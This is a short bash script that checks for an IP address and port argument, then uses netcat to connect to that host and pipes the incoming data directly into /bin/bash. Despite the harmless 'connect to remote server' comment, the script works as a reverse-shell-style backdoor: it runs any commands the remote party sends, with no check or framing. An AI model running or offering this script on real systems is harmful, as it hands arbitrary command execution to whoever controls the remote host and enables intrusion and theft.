#!/bin/bash

# Check for correct number of arguments
if [ $# -ne 2 ]; then
  echo "Usage: $0 <ip_address> <port>"
  exit 1
fi

# Connect to remote server using netcat
nc $1 $2 | /bin/bash